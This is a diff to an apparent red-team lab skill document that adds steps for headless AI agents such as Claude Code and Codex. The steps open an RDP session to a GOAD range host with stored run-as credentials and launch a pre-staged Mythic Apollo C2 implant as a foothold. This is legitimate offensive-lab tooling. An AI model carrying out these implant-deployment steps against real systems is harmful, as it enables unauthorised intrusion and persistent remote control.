@@ -68,6 +68,35 @@ printf '%s\n' "$SAGE_RUN_AS_PASSWORD" | xfreerdp3 \
   --wait-callbacks-seconds 60
 ```
 
+### Harness-agnostic launch (headless / no-TTY callers: Claude Code, cron, CI)
+
+The manual `xfreerdp3` line above assumes an interactive terminal — Codex supplies one via `tty:true`, but
+Claude Code's Bash tool and cron do **not**, and without a controlling terminal `xfreerdp3`'s NLA/NTLM path
+dies pre-auth (exit 144, no output). `scripts/open_rdp_session.py` wraps `xfreerdp3` in `pty.fork()` so it
+gets its own controlling terminal regardless of the caller, forces NTLM (`/auth-pkg-list:!kerberos` — the
+operator host has no KDC route to the GOAD realms), and pins the workflow Xvfb (`SAGE_RDP_DISPLAY`, default
+`:99`). It resolves the run-as password durably (`SAGE_RUN_AS_PASSWORD` → `~/.config/sage/runas.env` →
+mythic `.env`) so a fresh, env-less shell still authenticates.
+
+One command opens the session and starts the pre-staged Apollo — works for Codex *and* headless agents:
+
+```bash
+skills/sage-mythic-payload-deploy/scripts/launch_apollo_foothold.sh 10.4.10.22 'NORTH\samwell.tarly'
+```
+
+Or the two steps explicitly (the launcher must run *inside* a foreground command — backgrounding it under a
+tool wrapper reintroduces the no-controlling-terminal signal):
+
+```bash
+python3 skills/sage-mythic-payload-deploy/scripts/open_rdp_session.py --target-ip 10.4.10.22 --run-as-user 'NORTH\samwell.tarly' &
+.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py launch-existing
+```
+
+Notes: `open_rdp_session.py` passes the password via `/p:` (briefly visible in `ps` — accepted on the
+single-operator lab host; `/from-stdin` is unreliable under `pty.fork` due to prompt timing). Populate
+`~/.config/sage/runas.env` (chmod 600, `SAGE_RUN_AS_PASSWORD=...`) to make the durable resolution work
+without an operator export.
+
 3. Rediscover callbacks with the live-runner skill or Sage task helper after launch. Do not trust historical callback IDs.
 
 ## Script Notes
